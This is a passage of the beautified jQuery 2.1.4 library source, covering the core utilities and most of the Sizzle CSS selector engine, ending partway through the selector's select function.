/*! jQuery v2.1.4 | (c) 2005, 2015 jQuery Foundation, Inc. | jquery.org/license */ ! function(a, b) {
    "object" == typeof module && "object" == typeof module.exports ? module.exports = a.document ? b(a, !0) : function(a) {
        if (!a.document) throw new Error("jQuery requires a window with a document");
        return b(a)
    } : b(a)
}("undefined" != typeof window ? window : this, function(a, b) {
    var c = [],
        d = c.slice,
        e = c.concat,
        f = c.push,
        g = c.indexOf,
        h = {},
        i = h.toString,
        j = h.hasOwnProperty,
        k = {},
        l = a.document,
        m = "2.1.4",
        n = function(a, b) {
            return new n.fn.init(a, b)
        },
        o = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
        p = /^-ms-/,
        q = /-([\da-z])/gi,
        r = function(a, b) {
            return b.toUpperCase()
        };
    n.fn = n.prototype = {
        jquery: m,
        constructor: n,
        selector: "",
        length: 0,
        toArray: function() {
            return d.call(this)
        },
        get: function(a) {
            return null != a ? 0 > a ? this[a + this.length] : this[a] : d.call(this)
        },
        pushStack: function(a) {
            var b = n.merge(this.constructor(), a);
            return b.prevObject = this, b.context = this.context, b
        },
        each: function(a, b) {
            return n.each(this, a, b)
        },
        map: function(a) {
            return this.pushStack(n.map(this, function(b, c) {
                return a.call(b, c, b)
            }))
        },
        slice: function() {
            return this.pushStack(d.apply(this, arguments))
        },
        first: function() {
            return this.eq(0)
        },
        last: function() {
            return this.eq(-1)
        },
        eq: function(a) {
            var b = this.length,
                c = +a + (0 > a ? b : 0);
            return this.pushStack(c >= 0 && b > c ? [this[c]] : [])
        },
        end: function() {
            return this.prevObject || this.constructor(null)
        },
        push: f,
        sort: c.sort,
        splice: c.splice
    }, n.extend = n.fn.extend = function() {
        var a, b, c, d, e, f, g = arguments[0] || {},
            h = 1,
            i = arguments.length,
            j = !1;
        for ("boolean" == typeof g && (j = g, g = arguments[h] || {}, h++), "object" == typeof g || n.isFunction(g) || (g = {}), h === i && (g = this, h--); i > h; h++)
            if (null != (a = arguments[h]))
                for (b in a) c = g[b], d = a[b], g !== d && (j && d && (n.isPlainObject(d) || (e = n.isArray(d))) ? (e ? (e = !1, f = c && n.isArray(c) ? c : []) : f = c && n.isPlainObject(c) ? c : {}, g[b] = n.extend(j, f, d)) : void 0 !== d && (g[b] = d));
        return g
    }, n.extend({
        expando: "jQuery" + (m + Math.random()).replace(/\D/g, ""),
        isReady: !0,
        error: function(a) {
            throw new Error(a)
        },
        noop: function() {},
        isFunction: function(a) {
            return "function" === n.type(a)
        },
        isArray: Array.isArray,
        isWindow: function(a) {
            return null != a && a === a.window
        },
        isNumeric: function(a) {
            return !n.isArray(a) && a - parseFloat(a) + 1 >= 0
        },
        isPlainObject: function(a) {
            return "object" !== n.type(a) || a.nodeType || n.isWindow(a) ? !1 : a.constructor && !j.call(a.constructor.prototype, "isPrototypeOf") ? !1 : !0
        },
        isEmptyObject: function(a) {
            var b;
            for (b in a) return !1;
            return !0
        },
        type: function(a) {
            return null == a ? a + "" : "object" == typeof a || "function" == typeof a ? h[i.call(a)] || "object" : typeof a
        },
        globalEval: function(a) {
            var b, c = eval;
            a = n.trim(a), a && (1 === a.indexOf("use strict") ? (b = l.createElement("script"), b.text = a, l.head.appendChild(b).parentNode.removeChild(b)) : c(a))
        },
        camelCase: function(a) {
            return a.replace(p, "ms-").replace(q, r)
        },
        nodeName: function(a, b) {
            return a.nodeName && a.nodeName.toLowerCase() === b.toLowerCase()
        },
        each: function(a, b, c) {
            var d, e = 0,
                f = a.length,
                g = s(a);
            if (c) {
                if (g) {
                    for (; f > e; e++)
                        if (d = b.apply(a[e], c), d === !1) break
                } else
                    for (e in a)
                        if (d = b.apply(a[e], c), d === !1) break
            } else if (g) {
                for (; f > e; e++)
                    if (d = b.call(a[e], e, a[e]), d === !1) break
            } else
                for (e in a)
                    if (d = b.call(a[e], e, a[e]), d === !1) break;
            return a
        },
        trim: function(a) {
            return null == a ? "" : (a + "").replace(o, "")
        },
        makeArray: function(a, b) {
            var c = b || [];
            return null != a && (s(Object(a)) ? n.merge(c, "string" == typeof a ? [a] : a) : f.call(c, a)), c
        },
        inArray: function(a, b, c) {
            return null == b ? -1 : g.call(b, a, c)
        },
        merge: function(a, b) {
            for (var c = +b.length, d = 0, e = a.length; c > d; d++) a[e++] = b[d];
            return a.length = e, a
        },
        grep: function(a, b, c) {
            for (var d, e = [], f = 0, g = a.length, h = !c; g > f; f++) d = !b(a[f], f), d !== h && e.push(a[f]);
            return e
        },
        map: function(a, b, c) {
            var d, f = 0,
                g = a.length,
                h = s(a),
                i = [];
            if (h)
                for (; g > f; f++) d = b(a[f], f, c), null != d && i.push(d);
            else
                for (f in a) d = b(a[f], f, c), null != d && i.push(d);
            return e.apply([], i)
        },
        guid: 1,
        proxy: function(a, b) {
            var c, e, f;
            return "string" == typeof b && (c = a[b], b = a, a = c), n.isFunction(a) ? (e = d.call(arguments, 2), f = function() {
                return a.apply(b || this, e.concat(d.call(arguments)))
            }, f.guid = a.guid = a.guid || n.guid++, f) : void 0
        },
        now: Date.now,
        support: k
    }), n.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function(a, b) {
        h["[object " + b + "]"] = b.toLowerCase()
    });

    function s(a) {
        var b = "length" in a && a.length,
            c = n.type(a);
        return "function" === c || n.isWindow(a) ? !1 : 1 === a.nodeType && b ? !0 : "array" === c || 0 === b || "number" == typeof b && b > 0 && b - 1 in a
    }
    var t = function(a) {
        var b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u = "sizzle" + 1 * new Date,
            v = a.document,
            w = 0,
            x = 0,
            y = ha(),
            z = ha(),
            A = ha(),
            B = function(a, b) {
                return a === b && (l = !0), 0
            },
            C = 1 << 31,
            D = {}.hasOwnProperty,
            E = [],
            F = E.pop,
            G = E.push,
            H = E.push,
            I = E.slice,
            J = function(a, b) {
                for (var c = 0, d = a.length; d > c; c++)
                    if (a[c] === b) return c;
                return -1
            },
            K = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            L = "[\\x20\\t\\r\\n\\f]",
            M = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
            N = M.replace("w", "w#"),
            O = "\\[" + L + "*(" + M + ")(?:" + L + "*([*^$|!~]?=)" + L + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + N + "))|)" + L + "*\\]",
            P = ":(" + M + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + O + ")*)|.*)\\)|)",
            Q = new RegExp(L + "+", "g"),
            R = new RegExp("^" + L + "+|((?:^|[^\\\\])(?:\\\\.)*)" + L + "+$", "g"),
            S = new RegExp("^" + L + "*," + L + "*"),
            T = new RegExp("^" + L + "*([>+~]|" + L + ")" + L + "*"),
            U = new RegExp("=" + L + "*([^\\]'\"]*?)" + L + "*\\]", "g"),
            V = new RegExp(P),
            W = new RegExp("^" + N + "$"),
            X = {
                ID: new RegExp("^#(" + M + ")"),
                CLASS: new RegExp("^\\.(" + M + ")"),
                TAG: new RegExp("^(" + M.replace("w", "w*") + ")"),
                ATTR: new RegExp("^" + O),
                PSEUDO: new RegExp("^" + P),
                CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + L + "*(even|odd|(([+-]|)(\\d*)n|)" + L + "*(?:([+-]|)" + L + "*(\\d+)|))" + L + "*\\)|)", "i"),
                bool: new RegExp("^(?:" + K + ")$", "i"),
                needsContext: new RegExp("^" + L + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + L + "*((?:-\\d)?\\d*)" + L + "*\\)|)(?=[^-]|$)", "i")
            },
            Y = /^(?:input|select|textarea|button)$/i,
            Z = /^h\d$/i,
            $ = /^[^{]+\{\s*\[native \w/,
            _ = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
            aa = /[+~]/,
            ba = /'|\\/g,
            ca = new RegExp("\\\\([\\da-f]{1,6}" + L + "?|(" + L + ")|.)", "ig"),
            da = function(a, b, c) {
                var d = "0x" + b - 65536;
                return d !== d || c ? b : 0 > d ? String.fromCharCode(d + 65536) : String.fromCharCode(d >> 10 | 55296, 1023 & d | 56320)
            },
            ea = function() {
                m()
            };
        try {
            H.apply(E = I.call(v.childNodes), v.childNodes), E[v.childNodes.length].nodeType
        } catch (fa) {
            H = {
                apply: E.length ? function(a, b) {
                    G.apply(a, I.call(b))
                } : function(a, b) {
                    var c = a.length,
                        d = 0;
                    while (a[c++] = b[d++]);
                    a.length = c - 1
                }
            }
        }

        function ga(a, b, d, e) {
            var f, h, j, k, l, o, r, s, w, x;
            if ((b ? b.ownerDocument || b : v) !== n && m(b), b = b || n, d = d || [], k = b.nodeType, "string" != typeof a || !a || 1 !== k && 9 !== k && 11 !== k) return d;
            if (!e && p) {
                if (11 !== k && (f = _.exec(a)))
                    if (j = f[1]) {
                        if (9 === k) {
                            if (h = b.getElementById(j), !h || !h.parentNode) return d;
                            if (h.id === j) return d.push(h), d
                        } else if (b.ownerDocument && (h = b.ownerDocument.getElementById(j)) && t(b, h) && h.id === j) return d.push(h), d
                    } else {
                        if (f[2]) return H.apply(d, b.getElementsByTagName(a)), d;
                        if ((j = f[3]) && c.getElementsByClassName) return H.apply(d, b.getElementsByClassName(j)), d
                    }
                if (c.qsa && (!q || !q.test(a))) {
                    if (s = r = u, w = b, x = 1 !== k && a, 1 === k && "object" !== b.nodeName.toLowerCase()) {
                        o = g(a), (r = b.getAttribute("id")) ? s = r.replace(ba, "\\$&") : b.setAttribute("id", s), s = "[id='" + s + "'] ", l = o.length;
                        while (l--) o[l] = s + ra(o[l]);
                        w = aa.test(a) && pa(b.parentNode) || b, x = o.join(",")
                    }
                    if (x) try {
                        return H.apply(d, w.querySelectorAll(x)), d
                    } catch (y) {} finally {
                        r || b.removeAttribute("id")
                    }
                }
            }
            return i(a.replace(R, "$1"), b, d, e)
        }

        function ha() {
            var a = [];

            function b(c, e) {
                return a.push(c + " ") > d.cacheLength && delete b[a.shift()], b[c + " "] = e
            }
            return b
        }

        function ia(a) {
            return a[u] = !0, a
        }

        function ja(a) {
            var b = n.createElement("div");
            try {
                return !!a(b)
            } catch (c) {
                return !1
            } finally {
                b.parentNode && b.parentNode.removeChild(b), b = null
            }
        }

        function ka(a, b) {
            var c = a.split("|"),
                e = a.length;
            while (e--) d.attrHandle[c[e]] = b
        }

        function la(a, b) {
            var c = b && a,
                d = c && 1 === a.nodeType && 1 === b.nodeType && (~b.sourceIndex || C) - (~a.sourceIndex || C);
            if (d) return d;
            if (c)
                while (c = c.nextSibling)
                    if (c === b) return -1;
            return a ? 1 : -1
        }

        function ma(a) {
            return function(b) {
                var c = b.nodeName.toLowerCase();
                return "input" === c && b.type === a
            }
        }

        function na(a) {
            return function(b) {
                var c = b.nodeName.toLowerCase();
                return ("input" === c || "button" === c) && b.type === a
            }
        }

        function oa(a) {
            return ia(function(b) {
                return b = +b, ia(function(c, d) {
                    var e, f = a([], c.length, b),
                        g = f.length;
                    while (g--) c[e = f[g]] && (c[e] = !(d[e] = c[e]))
                })
            })
        }

        function pa(a) {
            return a && "undefined" != typeof a.getElementsByTagName && a
        }
        c = ga.support = {}, f = ga.isXML = function(a) {
            var b = a && (a.ownerDocument || a).documentElement;
            return b ? "HTML" !== b.nodeName : !1
        }, m = ga.setDocument = function(a) {
            var b, e, g = a ? a.ownerDocument || a : v;
            return g !== n && 9 === g.nodeType && g.documentElement ? (n = g, o = g.documentElement, e = g.defaultView, e && e !== e.top && (e.addEventListener ? e.addEventListener("unload", ea, !1) : e.attachEvent && e.attachEvent("onunload", ea)), p = !f(g), c.attributes = ja(function(a) {
                return a.className = "i", !a.getAttribute("className")
            }), c.getElementsByTagName = ja(function(a) {
                return a.appendChild(g.createComment("")), !a.getElementsByTagName("*").length
            }), c.getElementsByClassName = $.test(g.getElementsByClassName), c.getById = ja(function(a) {
                return o.appendChild(a).id = u, !g.getElementsByName || !g.getElementsByName(u).length
            }), c.getById ? (d.find.ID = function(a, b) {
                if ("undefined" != typeof b.getElementById && p) {
                    var c = b.getElementById(a);
                    return c && c.parentNode ? [c] : []
                }
            }, d.filter.ID = function(a) {
                var b = a.replace(ca, da);
                return function(a) {
                    return a.getAttribute("id") === b
                }
            }) : (delete d.find.ID, d.filter.ID = function(a) {
                var b = a.replace(ca, da);
                return function(a) {
                    var c = "undefined" != typeof a.getAttributeNode && a.getAttributeNode("id");
                    return c && c.value === b
                }
            }), d.find.TAG = c.getElementsByTagName ? function(a, b) {
                return "undefined" != typeof b.getElementsByTagName ? b.getElementsByTagName(a) : c.qsa ? b.querySelectorAll(a) : void 0
            } : function(a, b) {
                var c, d = [],
                    e = 0,
                    f = b.getElementsByTagName(a);
                if ("*" === a) {
                    while (c = f[e++]) 1 === c.nodeType && d.push(c);
                    return d
                }
                return f
            }, d.find.CLASS = c.getElementsByClassName && function(a, b) {
                    return p ? b.getElementsByClassName(a) : void 0
                }, r = [], q = [], (c.qsa = $.test(g.querySelectorAll)) && (ja(function(a) {
                o.appendChild(a).innerHTML = "<a id='" + u + "'></a><select id='" + u + "-\f]' msallowcapture=''><option selected=''></option></select>", a.querySelectorAll("[msallowcapture^='']").length && q.push("[*^$]=" + L + "*(?:''|\"\")"), a.querySelectorAll("[selected]").length || q.push("\\[" + L + "*(?:value|" + K + ")"), a.querySelectorAll("[id~=" + u + "-]").length || q.push("~="), a.querySelectorAll(":checked").length || q.push(":checked"), a.querySelectorAll("a#" + u + "+*").length || q.push(".#.+[+~]")
            }), ja(function(a) {
                var b = g.createElement("input");
                b.setAttribute("type", "hidden"), a.appendChild(b).setAttribute("name", "D"), a.querySelectorAll("[name=d]").length && q.push("name" + L + "*[*^$|!~]?="), a.querySelectorAll(":enabled").length || q.push(":enabled", ":disabled"), a.querySelectorAll("*,:x"), q.push(",.*:")
            })), (c.matchesSelector = $.test(s = o.matches || o.webkitMatchesSelector || o.mozMatchesSelector || o.oMatchesSelector || o.msMatchesSelector)) && ja(function(a) {
                c.disconnectedMatch = s.call(a, "div"), s.call(a, "[s!='']:x"), r.push("!=", P)
            }), q = q.length && new RegExp(q.join("|")), r = r.length && new RegExp(r.join("|")), b = $.test(o.compareDocumentPosition), t = b || $.test(o.contains) ? function(a, b) {
                var c = 9 === a.nodeType ? a.documentElement : a,
                    d = b && b.parentNode;
                return a === d || !(!d || 1 !== d.nodeType || !(c.contains ? c.contains(d) : a.compareDocumentPosition && 16 & a.compareDocumentPosition(d)))
            } : function(a, b) {
                if (b)
                    while (b = b.parentNode)
                        if (b === a) return !0;
                return !1
            }, B = b ? function(a, b) {
                if (a === b) return l = !0, 0;
                var d = !a.compareDocumentPosition - !b.compareDocumentPosition;
                return d ? d : (d = (a.ownerDocument || a) === (b.ownerDocument || b) ? a.compareDocumentPosition(b) : 1, 1 & d || !c.sortDetached && b.compareDocumentPosition(a) === d ? a === g || a.ownerDocument === v && t(v, a) ? -1 : b === g || b.ownerDocument === v && t(v, b) ? 1 : k ? J(k, a) - J(k, b) : 0 : 4 & d ? -1 : 1)
            } : function(a, b) {
                if (a === b) return l = !0, 0;
                var c, d = 0,
                    e = a.parentNode,
                    f = b.parentNode,
                    h = [a],
                    i = [b];
                if (!e || !f) return a === g ? -1 : b === g ? 1 : e ? -1 : f ? 1 : k ? J(k, a) - J(k, b) : 0;
                if (e === f) return la(a, b);
                c = a;
                while (c = c.parentNode) h.unshift(c);
                c = b;
                while (c = c.parentNode) i.unshift(c);
                while (h[d] === i[d]) d++;
                return d ? la(h[d], i[d]) : h[d] === v ? -1 : i[d] === v ? 1 : 0
            }, g) : n
        }, ga.matches = function(a, b) {
            return ga(a, null, null, b)
        }, ga.matchesSelector = function(a, b) {
            if ((a.ownerDocument || a) !== n && m(a), b = b.replace(U, "='$1']"), !(!c.matchesSelector || !p || r && r.test(b) || q && q.test(b))) try {
                var d = s.call(a, b);
                if (d || c.disconnectedMatch || a.document && 11 !== a.document.nodeType) return d
            } catch (e) {}
            return ga(b, n, null, [a]).length > 0
        }, ga.contains = function(a, b) {
            return (a.ownerDocument || a) !== n && m(a), t(a, b)
        }, ga.attr = function(a, b) {
            (a.ownerDocument || a) !== n && m(a);
            var e = d.attrHandle[b.toLowerCase()],
                f = e && D.call(d.attrHandle, b.toLowerCase()) ? e(a, b, !p) : void 0;
            return void 0 !== f ? f : c.attributes || !p ? a.getAttribute(b) : (f = a.getAttributeNode(b)) && f.specified ? f.value : null
        }, ga.error = function(a) {
            throw new Error("Syntax error, unrecognized expression: " + a)
        }, ga.uniqueSort = function(a) {
            var b, d = [],
                e = 0,
                f = 0;
            if (l = !c.detectDuplicates, k = !c.sortStable && a.slice(0), a.sort(B), l) {
                while (b = a[f++]) b === a[f] && (e = d.push(f));
                while (e--) a.splice(d[e], 1)
            }
            return k = null, a
        }, e = ga.getText = function(a) {
            var b, c = "",
                d = 0,
                f = a.nodeType;
            if (f) {
                if (1 === f || 9 === f || 11 === f) {
                    if ("string" == typeof a.textContent) return a.textContent;
                    for (a = a.firstChild; a; a = a.nextSibling) c += e(a)
                } else if (3 === f || 4 === f) return a.nodeValue
            } else
                while (b = a[d++]) c += e(b);
            return c
        }, d = ga.selectors = {
            cacheLength: 50,
            createPseudo: ia,
            match: X,
            attrHandle: {},
            find: {},
            relative: {
                ">": {
                    dir: "parentNode",
                    first: !0
                },
                " ": {
                    dir: "parentNode"
                },
                "+": {
                    dir: "previousSibling",
                    first: !0
                },
                "~": {
                    dir: "previousSibling"
                }
            },
            preFilter: {
                ATTR: function(a) {
                    return a[1] = a[1].replace(ca, da), a[3] = (a[3] || a[4] || a[5] || "").replace(ca, da), "~=" === a[2] && (a[3] = " " + a[3] + " "), a.slice(0, 4)
                },
                CHILD: function(a) {
                    return a[1] = a[1].toLowerCase(), "nth" === a[1].slice(0, 3) ? (a[3] || ga.error(a[0]), a[4] = +(a[4] ? a[5] + (a[6] || 1) : 2 * ("even" === a[3] || "odd" === a[3])), a[5] = +(a[7] + a[8] || "odd" === a[3])) : a[3] && ga.error(a[0]), a
                },
                PSEUDO: function(a) {
                    var b, c = !a[6] && a[2];
                    return X.CHILD.test(a[0]) ? null : (a[3] ? a[2] = a[4] || a[5] || "" : c && V.test(c) && (b = g(c, !0)) && (b = c.indexOf(")", c.length - b) - c.length) && (a[0] = a[0].slice(0, b), a[2] = c.slice(0, b)), a.slice(0, 3))
                }
            },
            filter: {
                TAG: function(a) {
                    var b = a.replace(ca, da).toLowerCase();
                    return "*" === a ? function() {
                        return !0
                    } : function(a) {
                        return a.nodeName && a.nodeName.toLowerCase() === b
                    }
                },
                CLASS: function(a) {
                    var b = y[a + " "];
                    return b || (b = new RegExp("(^|" + L + ")" + a + "(" + L + "|$)")) && y(a, function(a) {
                            return b.test("string" == typeof a.className && a.className || "undefined" != typeof a.getAttribute && a.getAttribute("class") || "")
                        })
                },
                ATTR: function(a, b, c) {
                    return function(d) {
                        var e = ga.attr(d, a);
                        return null == e ? "!=" === b : b ? (e += "", "=" === b ? e === c : "!=" === b ? e !== c : "^=" === b ? c && 0 === e.indexOf(c) : "*=" === b ? c && e.indexOf(c) > -1 : "$=" === b ? c && e.slice(-c.length) === c : "~=" === b ? (" " + e.replace(Q, " ") + " ").indexOf(c) > -1 : "|=" === b ? e === c || e.slice(0, c.length + 1) === c + "-" : !1) : !0
                    }
                },
                CHILD: function(a, b, c, d, e) {
                    var f = "nth" !== a.slice(0, 3),
                        g = "last" !== a.slice(-4),
                        h = "of-type" === b;
                    return 1 === d && 0 === e ? function(a) {
                        return !!a.parentNode
                    } : function(b, c, i) {
                        var j, k, l, m, n, o, p = f !== g ? "nextSibling" : "previousSibling",
                            q = b.parentNode,
                            r = h && b.nodeName.toLowerCase(),
                            s = !i && !h;
                        if (q) {
                            if (f) {
                                while (p) {
                                    l = b;
                                    while (l = l[p])
                                        if (h ? l.nodeName.toLowerCase() === r : 1 === l.nodeType) return !1;
                                    o = p = "only" === a && !o && "nextSibling"
                                }
                                return !0
                            }
                            if (o = [g ? q.firstChild : q.lastChild], g && s) {
                                k = q[u] || (q[u] = {}), j = k[a] || [], n = j[0] === w && j[1], m = j[0] === w && j[2], l = n && q.childNodes[n];
                                while (l = ++n && l && l[p] || (m = n = 0) || o.pop())
                                    if (1 === l.nodeType && ++m && l === b) {
                                        k[a] = [w, n, m];
                                        break
                                    }
                            } else if (s && (j = (b[u] || (b[u] = {}))[a]) && j[0] === w) m = j[1];
                            else
                                while (l = ++n && l && l[p] || (m = n = 0) || o.pop())
                                    if ((h ? l.nodeName.toLowerCase() === r : 1 === l.nodeType) && ++m && (s && ((l[u] || (l[u] = {}))[a] = [w, m]), l === b)) break;
                            return m -= e, m === d || m % d === 0 && m / d >= 0
                        }
                    }
                },
                PSEUDO: function(a, b) {
                    var c, e = d.pseudos[a] || d.setFilters[a.toLowerCase()] || ga.error("unsupported pseudo: " + a);
                    return e[u] ? e(b) : e.length > 1 ? (c = [a, a, "", b], d.setFilters.hasOwnProperty(a.toLowerCase()) ? ia(function(a, c) {
                        var d, f = e(a, b),
                            g = f.length;
                        while (g--) d = J(a, f[g]), a[d] = !(c[d] = f[g])
                    }) : function(a) {
                        return e(a, 0, c)
                    }) : e
                }
            },
            pseudos: {
                not: ia(function(a) {
                    var b = [],
                        c = [],
                        d = h(a.replace(R, "$1"));
                    return d[u] ? ia(function(a, b, c, e) {
                        var f, g = d(a, null, e, []),
                            h = a.length;
                        while (h--)(f = g[h]) && (a[h] = !(b[h] = f))
                    }) : function(a, e, f) {
                        return b[0] = a, d(b, null, f, c), b[0] = null, !c.pop()
                    }
                }),
                has: ia(function(a) {
                    return function(b) {
                        return ga(a, b).length > 0
                    }
                }),
                contains: ia(function(a) {
                    return a = a.replace(ca, da),
                        function(b) {
                            return (b.textContent || b.innerText || e(b)).indexOf(a) > -1
                        }
                }),
                lang: ia(function(a) {
                    return W.test(a || "") || ga.error("unsupported lang: " + a), a = a.replace(ca, da).toLowerCase(),
                        function(b) {
                            var c;
                            do
                                if (c = p ? b.lang : b.getAttribute("xml:lang") || b.getAttribute("lang")) return c = c.toLowerCase(), c === a || 0 === c.indexOf(a + "-"); while ((b = b.parentNode) && 1 === b.nodeType);
                            return !1
                        }
                }),
                target: function(b) {
                    var c = a.location && a.location.hash;
                    return c && c.slice(1) === b.id
                },
                root: function(a) {
                    return a === o
                },
                focus: function(a) {
                    return a === n.activeElement && (!n.hasFocus || n.hasFocus()) && !!(a.type || a.href || ~a.tabIndex)
                },
                enabled: function(a) {
                    return a.disabled === !1
                },
                disabled: function(a) {
                    return a.disabled === !0
                },
                checked: function(a) {
                    var b = a.nodeName.toLowerCase();
                    return "input" === b && !!a.checked || "option" === b && !!a.selected
                },
                selected: function(a) {
                    return a.parentNode && a.parentNode.selectedIndex, a.selected === !0
                },
                empty: function(a) {
                    for (a = a.firstChild; a; a = a.nextSibling)
                        if (a.nodeType < 6) return !1;
                    return !0
                },
                parent: function(a) {
                    return !d.pseudos.empty(a)
                },
                header: function(a) {
                    return Z.test(a.nodeName)
                },
                input: function(a) {
                    return Y.test(a.nodeName)
                },
                button: function(a) {
                    var b = a.nodeName.toLowerCase();
                    return "input" === b && "button" === a.type || "button" === b
                },
                text: function(a) {
                    var b;
                    return "input" === a.nodeName.toLowerCase() && "text" === a.type && (null == (b = a.getAttribute("type")) || "text" === b.toLowerCase())
                },
                first: oa(function() {
                    return [0]
                }),
                last: oa(function(a, b) {
                    return [b - 1]
                }),
                eq: oa(function(a, b, c) {
                    return [0 > c ? c + b : c]
                }),
                even: oa(function(a, b) {
                    for (var c = 0; b > c; c += 2) a.push(c);
                    return a
                }),
                odd: oa(function(a, b) {
                    for (var c = 1; b > c; c += 2) a.push(c);
                    return a
                }),
                lt: oa(function(a, b, c) {
                    for (var d = 0 > c ? c + b : c; --d >= 0;) a.push(d);
                    return a
                }),
                gt: oa(function(a, b, c) {
                    for (var d = 0 > c ? c + b : c; ++d < b;) a.push(d);
                    return a
                })
            }
        }, d.pseudos.nth = d.pseudos.eq;
        for (b in {
            radio: !0,
            checkbox: !0,
            file: !0,
            password: !0,
            image: !0
        }) d.pseudos[b] = ma(b);
        for (b in {
            submit: !0,
            reset: !0
        }) d.pseudos[b] = na(b);

        function qa() {}
        qa.prototype = d.filters = d.pseudos, d.setFilters = new qa, g = ga.tokenize = function(a, b) {
            var c, e, f, g, h, i, j, k = z[a + " "];
            if (k) return b ? 0 : k.slice(0);
            h = a, i = [], j = d.preFilter;
            while (h) {
                (!c || (e = S.exec(h))) && (e && (h = h.slice(e[0].length) || h), i.push(f = [])), c = !1, (e = T.exec(h)) && (c = e.shift(), f.push({
                    value: c,
                    type: e[0].replace(R, " ")
                }), h = h.slice(c.length));
                for (g in d.filter) !(e = X[g].exec(h)) || j[g] && !(e = j[g](e)) || (c = e.shift(), f.push({
                    value: c,
                    type: g,
                    matches: e
                }), h = h.slice(c.length));
                if (!c) break
            }
            return b ? h.length : h ? ga.error(a) : z(a, i).slice(0)
        };

        function ra(a) {
            for (var b = 0, c = a.length, d = ""; c > b; b++) d += a[b].value;
            return d
        }

        function sa(a, b, c) {
            var d = b.dir,
                e = c && "parentNode" === d,
                f = x++;
            return b.first ? function(b, c, f) {
                while (b = b[d])
                    if (1 === b.nodeType || e) return a(b, c, f)
            } : function(b, c, g) {
                var h, i, j = [w, f];
                if (g) {
                    while (b = b[d])
                        if ((1 === b.nodeType || e) && a(b, c, g)) return !0
                } else
                    while (b = b[d])
                        if (1 === b.nodeType || e) {
                            if (i = b[u] || (b[u] = {}), (h = i[d]) && h[0] === w && h[1] === f) return j[2] = h[2];
                            if (i[d] = j, j[2] = a(b, c, g)) return !0
                        }
            }
        }

        function ta(a) {
            return a.length > 1 ? function(b, c, d) {
                var e = a.length;
                while (e--)
                    if (!a[e](b, c, d)) return !1;
                return !0
            } : a[0]
        }

        function ua(a, b, c) {
            for (var d = 0, e = b.length; e > d; d++) ga(a, b[d], c);
            return c
        }

        function va(a, b, c, d, e) {
            for (var f, g = [], h = 0, i = a.length, j = null != b; i > h; h++)(f = a[h]) && (!c || c(f, d, e)) && (g.push(f), j && b.push(h));
            return g
        }

        function wa(a, b, c, d, e, f) {
            return d && !d[u] && (d = wa(d)), e && !e[u] && (e = wa(e, f)), ia(function(f, g, h, i) {
                var j, k, l, m = [],
                    n = [],
                    o = g.length,
                    p = f || ua(b || "*", h.nodeType ? [h] : h, []),
                    q = !a || !f && b ? p : va(p, m, a, h, i),
                    r = c ? e || (f ? a : o || d) ? [] : g : q;
                if (c && c(q, r, h, i), d) {
                    j = va(r, n), d(j, [], h, i), k = j.length;
                    while (k--)(l = j[k]) && (r[n[k]] = !(q[n[k]] = l))
                }
                if (f) {
                    if (e || a) {
                        if (e) {
                            j = [], k = r.length;
                            while (k--)(l = r[k]) && j.push(q[k] = l);
                            e(null, r = [], j, i)
                        }
                        k = r.length;
                        while (k--)(l = r[k]) && (j = e ? J(f, l) : m[k]) > -1 && (f[j] = !(g[j] = l))
                    }
                } else r = va(r === g ? r.splice(o, r.length) : r), e ? e(null, g, r, i) : H.apply(g, r)
            })
        }

        function xa(a) {
            for (var b, c, e, f = a.length, g = d.relative[a[0].type], h = g || d.relative[" "], i = g ? 1 : 0, k = sa(function(a) {
                return a === b
            }, h, !0), l = sa(function(a) {
                return J(b, a) > -1
            }, h, !0), m = [function(a, c, d) {
                var e = !g && (d || c !== j) || ((b = c).nodeType ? k(a, c, d) : l(a, c, d));
                return b = null, e
            }]; f > i; i++)
                if (c = d.relative[a[i].type]) m = [sa(ta(m), c)];
                else {
                    if (c = d.filter[a[i].type].apply(null, a[i].matches), c[u]) {
                        for (e = ++i; f > e; e++)
                            if (d.relative[a[e].type]) break;
                        return wa(i > 1 && ta(m), i > 1 && ra(a.slice(0, i - 1).concat({
                                value: " " === a[i - 2].type ? "*" : ""
                            })).replace(R, "$1"), c, e > i && xa(a.slice(i, e)), f > e && xa(a = a.slice(e)), f > e && ra(a))
                    }
                    m.push(c)
                }
            return ta(m)
        }

        function ya(a, b) {
            var c = b.length > 0,
                e = a.length > 0,
                f = function(f, g, h, i, k) {
                    var l, m, o, p = 0,
                        q = "0",
                        r = f && [],
                        s = [],
                        t = j,
                        u = f || e && d.find.TAG("*", k),
                        v = w += null == t ? 1 : Math.random() || .1,
                        x = u.length;
                    for (k && (j = g !== n && g); q !== x && null != (l = u[q]); q++) {
                        if (e && l) {
                            m = 0;
                            while (o = a[m++])
                                if (o(l, g, h)) {
                                    i.push(l);
                                    break
                                }
                            k && (w = v)
                        }
                        c && ((l = !o && l) && p--, f && r.push(l))
                    }
                    if (p += q, c && q !== p) {
                        m = 0;
                        while (o = b[m++]) o(r, s, g, h);
                        if (f) {
                            if (p > 0)
                                while (q--) r[q] || s[q] || (s[q] = F.call(i));
                            s = va(s)
                        }
                        H.apply(i, s), k && !f && s.length > 0 && p + b.length > 1 && ga.uniqueSort(i)
                    }
                    return k && (w = v, j = t), r
                };
            return c ? ia(f) : f
        }
        return h = ga.compile = function(a, b) {
            var c, d = [],
                e = [],
                f = A[a + " "];
            if (!f) {
                b || (b = g(a)), c = b.length;
                while (c--) f = xa(b[c]), f[u] ? d.push(f) : e.push(f);
                f = A(a, ya(e, d)), f.selector = a
            }
            return f
        }, i = ga.select = function(a, b, e, f) {
            var i, j, k, l, m, n = "function" == typeof a && a,
                o = !f && g(a = n.selector || a);
            if (e = e || [], 1 === o.length) {
